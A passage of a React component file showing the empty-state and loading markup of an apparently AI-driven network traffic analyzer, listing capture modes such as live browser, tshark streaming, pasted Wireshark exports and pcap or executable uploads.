                      <div className="w-3 h-3 border-2 border-primary border-t-transparent rounded-full animate-spin" />
                      Generating AI analysis...
                    </div>
                  )}
                </div>
              </div>
            </>
          ) : (
            <div className="rounded-xl border border-dashed border-border bg-card/50 flex flex-col items-center justify-center min-h-96 text-center p-8">
              <div className="w-16 h-16 rounded-full bg-muted/30 flex items-center justify-center mb-4">
                <Zap className="w-7 h-7 text-muted-foreground" />
              </div>
              <div className="text-sm font-semibold text-muted-foreground">Analysis Results</div>
              <div className="text-xs text-muted-foreground/70 mt-1 max-w-xs">
                Capture live browser traffic or stream tshark packets — AI analyzes for malware patterns in real-time.
              </div>
              <div className="mt-4 grid grid-cols-1 gap-1.5 text-[10px] text-muted-foreground/50 text-left w-full max-w-xs">
                <div className="flex items-center gap-2"><Monitor className="w-3 h-3" /> Live Browser: auto-captures all network requests instantly</div>
                <div className="flex items-center gap-2"><Radio className="w-3 h-3" /> Live tshark: pipe real packet captures via WebSocket</div>
                <div className="flex items-center gap-2"><Wifi className="w-3 h-3" /> Manual: paste Wireshark/tshark text export</div>
                <div className="flex items-center gap-2"><Upload className="w-3 h-3" /> File: upload .pcap, .pcapng, .exe, .log files</div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
